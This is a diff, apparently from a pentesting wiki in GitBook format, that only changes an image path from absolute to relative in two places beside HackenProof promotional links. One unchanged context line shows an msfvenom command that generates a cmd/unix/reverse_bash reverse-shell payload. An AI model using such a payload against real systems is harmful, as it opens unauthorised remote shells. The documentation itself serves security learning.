@@ -17,7 +17,7 @@
 </details>
 
 
-<figure><img src="/.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 **[Follow HackenProof](https://bit.ly/3xrrDrL) to learn more about web3 bugs**
 
@@ -195,7 +195,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 ```
 
 
-<figure><img src="/.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
 
 **[Follow HackenProof](https://bit.ly/3xrrDrL) to learn more about web3 bugs**
 
